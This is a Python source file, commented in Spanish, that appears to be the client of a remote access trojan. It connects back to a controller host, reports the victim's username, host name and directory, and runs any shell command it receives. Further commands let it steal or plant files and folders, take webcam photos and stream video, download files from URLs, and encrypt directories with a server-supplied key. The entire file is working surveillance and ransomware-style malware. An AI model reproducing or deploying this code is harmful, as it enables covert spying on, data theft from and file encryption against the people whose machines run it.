import socket
import os
import getpass
import re
import pickle
import struct
import requests
import cv2
import platform
from time import sleep
from subprocess import Popen, PIPE
from zipfile import ZipFile
from cryptography.fernet import Fernet
from random import randint
from udp import UDP

# Clase client-TCP
class TCP:
    # Se inicializa el host, el port y el chunk del programa
    def __init__(self, host, port):
        # host --> standar>localhost
        self.__host = host
        # port --> 1024-65535
        self.__port = port
        # chunk --> 4MB para enviar informacion
        self.__chunk = 4194304
        self.__myOs = platform.system().lower()

    def conectar(self):
        # Se inicia el ciclo para crear la conexion
        while True:
            try:
                # Se crea un socket
                self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # Se configura el socket
                self.__sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

                # Se intenta conectar al servidor
                self.__sock.connect((self.__host, self.__port))

                sleep(0.05)
                # Se obtiene y se manda la informacion inicial
                userName = getpass.getuser()
                hostName = socket.gethostname()
                currentDir = os.getcwd()
                info = userName + '\n' + hostName + '\n' + currentDir
                self.__sock.send(info.encode())

                break

            except:
                # Si no se consigue una conexion, se espera 5 segundos
                sleep(5)

    # Funcion para regresar el nombre de un archivo o directorio
    # ubicacion --> ubicacion del archivo o directorio
    def getNombre(self, ubicacion):
        nombre = os.path.abspath(ubicacion)
        nombre = os.path.basename(nombre)
        return nombre

    # Funcion para regresar si un archivo es una imagen
    # ubicacion --> ubicacion del archivo
    def isImage(self, ubicacion):
        ext = [".jpg", ".png", ".jpeg", ".webp"]
        imagen = False
        for i in ext:
            if ubicacion.lower().endswith(i):
                imagen = True
                break

        # Se regresa si el archivo es imagen o no
        return imagen

    # Funcion para enviar datos
    # info --> informacion a enviar
    def enviarDatos(self, info):
        info = pickle.dumps(info)
        info = struct.pack('Q', len(info))+info
        self.__sock.sendall(info)

    # Funcion para recibir datos
    def recibirDatos(self):
        data = b''
        size = struct.calcsize('Q')
        while len(data) < size:
            info = self.__sock.recv(self.__chunk)
            data += info

        dataSize = data[:size]
        data = data[size:]
        byteSize = struct.unpack('Q', dataSize)[0]

        while len(data) < byteSize:
            data += self.__sock.recv(self.__chunk)

        info = data[:byteSize]
        data = data[byteSize:]
        info = pickle.loads(info)

        # Se regresa la informacion tratada para ser usada
        return info

    # Funcion para enviar un archivo
    # ubicacion --> ubicacion del archivo que se quiere enviar
    def enviarArchivo(self, ubicacion):
        sleep(0.05)
        peso = os.path.getsize(ubicacion)
        paquetes = int(peso/self.__chunk)
        self.__sock.send(f"{peso}-{paquetes}".encode())

        if peso > 0:
            sleep(0.1)
            with open(ubicacion, 'rb') as archivo:
                info = archivo.read(self.__chunk)
                while info:
                    self.enviarDatos(info)
                    info = archivo.read(self.__chunk)
                    msg = self.__sock.recv(8).decode()
                    if msg == "end":
                        break
            archivo.close()

    # Funcion para recibir un archivo
    # ubicacion --> ubicacion en donde se guardara el archivo recibido
    def recibirArchivo(self, ubicacion):
        peso = int(self.__sock.recv(1024).decode())
        if peso > 0:
            with open(ubicacion, 'wb') as archivo:
                while True:
                    info = self.recibirDatos()
                    archivo.write(info)

                    if len(info) < self.__chunk:
                        self.__sock.send("end".encode())
                        break
                    else:
                        self.__sock.send("ok".encode())
            archivo.close()

    # Funcion para enviar archivos de un directorio
    # origen --> ubicacion del directorio que se quiere enviar
    # index --> indice desde el que se quiere iniciar
    def enviarDirectorio(self, origen, index):
        # Se obtiene el numero de archivos
        archivos = []
        for i in os.listdir(origen):
            archivo = f"{origen}/{i}"
            if os.path.isfile(archivo):
                archivos.append(archivo)

        sleep(0.2)
        tam = len(archivos)
        self.__sock.send(str(tam).encode())

        # Se comienzan a enviar los archivos
        if index > tam:
            index = 1
        while index <= tam:
            nombre = self.getNombre(archivos[index-1])
            peso = os.path.getsize(archivos[index-1])
            paquetes = str(int(peso/self.__chunk))
            info = nombre + '\n' + paquetes + '\n' + str(peso)
            sleep(0.1)
            self.__sock.send(info.encode())

            res = self.__sock.recv(1024).decode()
            if res == 'S':
                self.enviarArchivo(archivos[index-1])
                msg = self.__sock.recv(1024).decode()
                if msg == "error":
                    break
            elif res == "quit":
                break
            else:
                pass

            index += 1
            sleep(0.05)

    # Funcion para recibir un directorio
    # destino --> directorio en el que se guardaran los archivos
    # index --> indice de referencia
    def recibirDirectorio(self, destino, index):
        # Si no existe el directorio destino, se crea
        if not os.path.isdir(destino):
            os.mkdir(destino)

        # Se recibe el numero de archivos
        tam = int(self.__sock.recv(1024).decode())

        # Se comienzan a recibir los archivos
        if index > tam:
            index = 1
        while index <= tam:
            res = self.__sock.recv(1024).decode()

            if res == 'S':
                try:
                    nombre = self.__sock.recv(1024).decode()
                    self.recibirArchivo(f"{destino}/{nombre}")
                    sleep(0.08)
                    self.__sock.send("ok".encode())
                except:
                    self.__sock.send("error: Error al recibir el archivo (sdt)".encode())
                    break
            elif res == "quit":
                break
            else:
                pass

            index += 1

    # Funcion para cambiar de directorio
    # directorio --> directorio al que se quiere cambiar
    def cd(self, directorio):
        if os.path.isdir(directorio):
            os.chdir(directorio)
            self.__sock.send(os.getcwd().encode())

        else:
            self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())

    # Funcion para enviar un archivo al servidor
    # cmd --> comando recibido
    def sendFileFrom(self, cmd):
        if re.search("-d[= ]", cmd):
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]

            if os.path.isfile(origen):
                self.__sock.send("ok".encode())
                self.enviarArchivo(origen)

            else:
                self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())

        else:
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]

            if os.path.isfile(origen):
                self.__sock.send("ok".encode())
                nombre = self.getNombre(origen)

                sleep(0.05)
                self.__sock.send(nombre.encode())
                self.enviarArchivo(origen)

            else:
                self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())

    # Funcion para recibir un archivo del servidor
    # cmd --> comando recibido
    def sendFileTo(self, cmd):
        if re.search("-d[= ]", cmd):
            destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
            self.recibirArchivo(destino)

        else:
            destino = self.__sock.recv(1024).decode()
            self.recibirArchivo(destino)

    # Funcion para enviar una imagen al servidor
    # cmd --> comando recibido
    def image(self, cmd):
        if re.search("-r[= ]", cmd):
            imagenes = []
            for i in os.listdir(os.getcwd()):
                archivo = f"{os.getcwd()}/{i}"
                if os.path.isfile(archivo) and self.isImage(archivo):
                    imagenes.append(archivo)

            num = randint(0, len(imagenes)-1)
            imagen = imagenes[num]

        else:
            if re.search("-t[= ]", cmd):
                imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*) -t", cmd)[0]
            else:
                imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*)", cmd)[0]

        if os.path.isfile(imagen) and self.isImage(imagen):
            self.__sock.send("ok".encode())
            sleep(0.05)
            nombre = self.getNombre(imagen)
            self.__sock.send(nombre.encode())

            archivo = open(imagen, 'rb')
            info = archivo.read()
            archivo.close()

            sleep(0.05)
            self.enviarDatos(info)

        else:
            self.__sock.send(f"error: Imagen \"{imagen}\" no encontrada".encode())

    # Funcion para tomar una foto y enviarla al servidor
    # cmd --> comando recibido
    def pic(self, cmd):
        camara = int(re.findall("-c[= ]([0-9].*)", cmd)[0])
        captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)

        leido, frame = captura.read()
        captura.release()

        if leido:
            self.__sock.send("ok".encode())
            sleep(0.05)

            frame = cv2.imencode(".jpg", frame)[1]
            self.enviarDatos(frame)
        
        else:
            self.__sock.send(f"error: Camara \"{camara}\" no encontrada".encode())

    # Funcion para enviar video de la camara al servidor
    # cmd --> comando recibido
    def captura(self, cmd):
        camara = int(re.findall("-c[= ]([0-9. ].*)", cmd)[0])
        udp = UDP(self.__host, self.__port)

        captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)
        leido = captura.read()[0]

        if leido:
            self.__sock.send("ok".encode())
            try:
                udp.conectar()
                sleep(0.1)
                udp.captura(camara)
                udp.close()
                captura.release()
                self.__sock.send("client-UDP desconectado".encode())
            except:
                udp.close()
                captura.release()
                self.__sock.send("client-UDP desconectado".encode())
        else:
            self.__sock.send(f"error: Camara \"{camara}\" no encontrada".encode())
            captura.release()

    # Funcion para enviar un directorio al servidor
    # cmd --> comando recibido
    def sendDirFrom(self, cmd):
        if re.search("-d[= ]", cmd):
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
            if re.search("-i[= ]", cmd):
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                index = 1

            if os.path.isdir(origen):
                self.__sock.send("ok".encode())
                self.enviarDirectorio(origen, index)

            else:
                self.__sock.send(f"error: Directorio \"{origen}\" no encontrado".encode())

        else:
            if re.search("-i[= ]", cmd):
                origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
                index = 1

            if os.path.isdir(origen):
                self.__sock.send("ok".encode())
                sleep(0.05)
                self.__sock.send(self.getNombre(origen).encode())
                self.enviarDirectorio(origen, index)

            else:
                self.__sock.send(f"error: Directorio \"{origen}\" no encontrado".encode())

    # Funcion para recibir un directorio del servidor
    # cmd --> comando recibido
    def sendDirTo(self, cmd):
        if re.search("-d[= ]", cmd):
            if re.search("-i[= ]", cmd):
                destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
                index = 1

            self.recibirDirectorio(destino, index)

        else:
            if re.search("-i[= ]", cmd):
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                index = 1

            destino = self.__sock.recv(1024).decode()
            self.recibirDirectorio(destino, index)

    # Funcion para comprimir un directorio
    # cmd --> comando recibido
    def comprimir(self, cmd):
        if re.search("-d[= ]", cmd):
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
            destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
        else:
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
            destino = f"{self.getNombre(origen)}.zip"

        if os.path.isfile(origen) and not origen.endswith(".zip"):
            nombre = self.getNombre(origen)
            with ZipFile(destino, 'w') as zip:
                zip.write(origen, nombre)
            zip.close()
            info = f"Archivo \"{nombre}\" comprimido"

        elif os.path.isdir(origen):
            comprimidos = 0
            cont = 0
            with ZipFile(destino, 'w') as zip:
                for i in os.listdir(origen):
                    archivo = f"{origen}/{i}"
                    if os.path.isfile(archivo):
                        zip.write(archivo, i)
                        comprimidos += 1
                    cont += 1
            zip.close()
            info = f"{comprimidos} elementos comprimidos de {cont}"

        else:
            info = f"error: Error al comprimir el archivo o directorio \"{origen}\""

        self.__sock.send(info.encode())

    # Funcion para descomprimir un archivo '.zip'
    # cmd --> comando recibido
    def descomprimir(self, cmd):
        if re.search("-d[= ]", cmd):
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
            destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
        else:
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
            destino = self.getNombre(origen).replace(".zip", '')

        if os.path.isfile(origen):
            if not os.path.isdir(destino):
                os.mkdir(destino)

            descomprimidos = 0
            with ZipFile(origen, 'r') as zip:
                for i in zip.namelist():
                    zip.extract(i, destino)
                    descomprimidos += 1
            zip.close()

            self.__sock.send(f"{descomprimidos} elementos descomprimidos".encode())
        else:
            self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())

    # Funcion para encriptar un directorio
    # cmd --> comando recibido
    def encrypt(self, cmd):
        key = self.__sock.recv(1024)
        directorio = re.findall("-e[= ]([a-zA-Z0-9./ ].*)", cmd)[0]

        if os.path.isdir(directorio):
            nombre = self.getNombre(directorio)
            self.__sock.send(f"ok\n{nombre}".encode())

            res = self.__sock.recv(1024).decode()
            if res == 'S':
                try:
                    archivos = []
                    for i in os.listdir(directorio):
                        archivo = f"{directorio}/{i}"
                        if os.path.isfile(archivo):
                            archivos.append(archivo)

                    with open(f"{directorio}/.info.dat", 'w') as texto:
                        f = Fernet(key)
                        cont = 0
                        for i in archivos:
                            nombre = os.path.basename(i)
                            peso = os.path.getsize(i)
                            if peso > 0:
                                with open(i, 'rb') as archivo:
                                    data = archivo.read()
                                archivo.close()

                                dataEncrypt = f.encrypt(data)

                                with open(i, 'wb') as archivo:
                                    archivo.write(dataEncrypt)
                                archivo.close()
                                texto.write(f"[+] Archivo \"{nombre}\" encriptado\n")
                                cont += 1
                    texto.close()

                    self.__sock.send(f"{cont} archivos encriptados".encode())
                    self.enviarArchivo(f"{directorio}/.info.dat")
                    os.remove(f"{directorio}/.info.dat")

                except:
                    self.__sock.send("error: Error en el proceso de encriptacion".encode())

            else:
                self.__sock.send("Encriptacion cancelada".encode())

        else:
            self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())

    # Funcion para desencriptar un directorio
    # cmd --> comando recibido
    def decrypt(self, cmd):
        key = self.__sock.recv(1024)
        directorio = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]

        if os.path.isdir(directorio):
            clave = self.getNombre(directorio)
            self.__sock.send(f"ok\n{clave}".encode())

            res = self.__sock.recv(1024).decode()
            if res == 'S':
                try:
                    archivos = []
                    for i in os.listdir(directorio):
                        archivo = f"{directorio}/{i}"
                        if os.path.isfile(archivo):
                            archivos.append(archivo)

                    with open(f"{directorio}/.{clave}.dat", 'w') as texto:
                        f = Fernet(key)
                        cont = 0
                        for i in archivos:
                            nombre = os.path.basename(i)
                            peso = os.path.getsize(i)
                            if peso > 0:
                                with open(i, 'rb') as archivo:
                                    data = archivo.read()
                                archivo.close()

                                dataDecrypt = f.decrypt(data)

                                with open(i, 'wb') as archivo:
                                    archivo.write(dataDecrypt)
                                archivo.close()

                                texto.write(f"[+] Archivo \"{nombre}\" desencriptado\n")
                                cont += 1
                    texto.close()

                    self.__sock.send(f"{cont} archivos desencriptados".encode())
                    self.enviarArchivo(f"{directorio}/.{clave}.dat")
                    os.remove(f"{directorio}/.{clave}.dat")

                except:
                    self.__sock.send("error: Error en el proceso de desencriptacion".encode())

            else:
                self.__sock.send("Desencriptacion cancelada".encode())

        else:
            self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())

    # Funcion para descargar archivos web
    # cmd --> comando recibido
    def wget(self, cmd):
        extensiones = ["jpg", "png", "jpeg", "webp", "svg", "mp4", "avi", "mkv", "mp3", "txt", "dat",
            "html", "css", "js", "py", "c", "cpp", "java", "go", "rb", "php", "ino", "tex", "m", "pdf"]
        extensionesUpper = [i.upper() for i in extensiones]

        if re.search("-n[= ]", cmd):
            url = re.findall("-u[= ]([a-zA-Z0-9./ ].*) -n", cmd)[0]
            nombre = re.findall("-n[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
            valido = True
        else:
            url = re.findall("-u[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
            valido = False
            i = 0
            while i < len(extensiones):
                if re.search(f"[.]{extensiones[i]}", url):
                    valido = True
                    ext = extensiones[i]
                    break
                if re.search(f"[.]{extensionesUpper[i]}", url):
                    valido = True
                    ext = extensionesUpper[i]
                    break
                i += 1

            if valido:
                nombre = re.findall(f"/([a-zA-Z0-9_ ].+[.]{ext})", url)[0]
                nombre = nombre.split('/')[-1]

        if valido:
            self.__sock.send("ok".encode())
            try:
                req = requests.get(url)

                with open(nombre, 'wb') as archivo:
                    archivo.write(req.content)
                archivo.close()

                self.__sock.send(f"Archivo \"{nombre}\" descargado correctamente".encode())

            except:
                self.__sock.send(f"error: Error al descargar el archivo".encode())
        else:
            self.__sock.send("error: URL no valida".encode())

    # Funcion para enviar al servidor la cantidad de elementos de un directorio
    # cmd --> comando recibido
    def lenDir(self, cmd):
        directorio = re.findall("-p[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
        if os.path.isdir(directorio):
            self.__sock.send("ok".encode())
            cont = 0
            sleep(0.08)

            if re.search("-f[= ]", cmd):
                for i in os.listdir(directorio):
                    archivo = f"{directorio}/{i}"
                    if os.path.isfile(archivo):
                        cont += 1
                self.__sock.send(f"{cont} archivos encontrados".encode())
            elif re.search("-d[= ]", cmd):
                for i in os.listdir(directorio):
                    carpeta = f"{directorio}/{i}"
                    if os.path.isdir(carpeta):
                        cont += 1
                self.__sock.send(f"{cont} directorios encontrados".encode())
            elif re.search("-a[= ]", cmd):
                cont = len(os.listdir(directorio))
                self.__sock.send(f"{cont} elementos encontrados".encode())
            else:
                cont = len(os.listdir(directorio))
                self.__sock.send(f"{cont} elementos encontrados".encode())

        else:
            self.__sock.send("error: Directorio \"{directorio}\" no encontrado".encode())

    # Funcion para enviar a un archivo del servidor la salida de un comando
    # cmd --> comando recibido
    def save(self, cmd):
        sleep(0.1)
        if cmd[:4] == "open":
            self.enviarDatos("No se puede almacenar informacion".encode())
        else:
            comando = Popen(cmd, shell=PIPE, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            info = comando.stdout.read() + comando.stderr.read()
            if self.__myOs == "linux" or self.__myOs == "darwin":
                info = info.decode("utf-8")
            if self.__myOs == "windows":
                info = info.decode("cp850")

            if info == '':
                self.__sock.send("[+] Comando ejecutado --> Salida vacia".encode())
            else:
                i = 0
                while i < len(info):
                    self.enviarDatos(info[i:i+self.__chunk].encode())
                    i += self.__chunk

    # Funcion para recibir y evaluar comandos
    def shell(self):
        try:
            while True:
                # Se recibe el comando
                cmd = self.__sock.recv(1024).decode()

                # Si el comando es 'exit'...
                if cmd.lower() == "exit":
                    try:
                        # Se termina la conexion
                        self.__sock.close()
                        break

                    except:
                        continue

                # Si el comando es 'q' o 'quit'...
                elif cmd.lower() == 'q' or cmd.lower() == "quit":
                    try:
                        # Se cierra el socket
                        self.__sock.close()
                        # Y se manda a llamar a la funcion
                        # 'self.conectar'
                        self.conectar()

                    except:
                        continue

                # Si el comando es 'cd'...
                elif cmd.lower()[:2] == "cd":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.cd'
                        self.cd(cmd[3:])

                    except:
                        continue

                # Si el comando es 'sff'...
                elif cmd.lower()[:3] == "sff":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.sendFileFrom'
                        self.sendFileFrom(cmd)

                    except:
                        continue

                # Si el comando es 'sft'...
                elif cmd.lower()[:3] == "sft":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.sendFileTo'
                        self.sendFileTo(cmd)

                    except:
                        continue

                # Si el comando es 'img'...
                elif cmd.lower()[:3] == "img":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.image'
                        self.image(cmd)

                    except:
                        continue

                # Si el comando es 'pic'...
                elif cmd.lower()[:3] == "pic":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.pic'
                        self.pic(cmd)

                    except:
                        continue

                # Si el comando es 'cap'...
                elif cmd.lower()[:3] == "cap":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.captura'
                        self.captura(cmd)

                    except:
                        continue

                # Si el comando es 'sdf'...
                elif cmd.lower()[:3] == "sdf":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.sendDirFrom'
                        self.sendDirFrom(cmd)

                    except:
                        continue

                # Si el comando es 'sdt'...
                elif cmd.lower()[:3] == "sdt":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.sendDirTo'
                        self.sendDirTo(cmd)

                    except:
                        continue

                # Si el comando es 'zip'...
                elif cmd.lower()[:3] == "zip":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.comprimir'
                        self.comprimir(cmd)

                    except:
                        continue

                # Si el comando es 'unzip'...
                elif cmd.lower()[:5] == "unzip":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.descomprimir'
                        self.descomprimir(cmd)

                    except:
                        continue

                # Si el comando es 'encrypt'...
                elif cmd.lower()[:7] == "encrypt":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.encrypt'
                        self.encrypt(cmd)

                    except:
                        continue

                # Si el comando es 'decrypt'...
                elif cmd.lower()[:7] == "decrypt":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.decrypt'
                        self.decrypt(cmd)

                    except:
                        continue

                # Si el comando es 'miwget'...
                elif cmd.lower()[:6] == "miwget":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.wget'
                        self.wget(cmd)

                    except:
                        continue

                # Si el comando es 'lendir'...
                elif cmd.lower()[:6] == "lendir":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.lenDir'
                        self.lenDir(cmd)

                    except:
                        continue

                # Si el comando es 'save'...
                elif cmd.lower()[:4] == "save":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.save'
                        cmd = cmd[5:]
                        self.save(cmd)

                    except:
                        continue

                # Si no hay una coincidencia, se ejecuta el comando
                # y se envia lo que este regresa
                else:
                    try:
                        if cmd.lower()[:4] == "open":
                            if self.__myOs == "linux" or self.__myOs == "darwin":
                                os.system(cmd[:4].lower() + cmd[5:])
                            if self.__myOs == "windows":
                                os.system(cmd[5:])
                            self.__sock.send("[+] Comando ejecutado".encode())

                        else:
                            comando = Popen(cmd, shell=PIPE, stdin=PIPE, stdout=PIPE, stderr=PIPE)
                            info = comando.stdout.read() + comando.stderr.read()
                            if self.__myOs.lower() == "linux" or self.__myOs.lower() == "darwin":
                                info = info.decode("utf-8")
                            if self.__myOs == "windows":
                                info = info.decode("cp850")

                            if info == '':
                                self.enviarDatos("[+] Comando ejecutado --> Salida vacia".encode())

                            else:
                                i = 0
                                while i < len(info):
                                    self.enviarDatos(info[i:i+self.__chunk].encode())
                                    i += self.__chunk

                    except:
                        continue

        except:
            self.conectar()
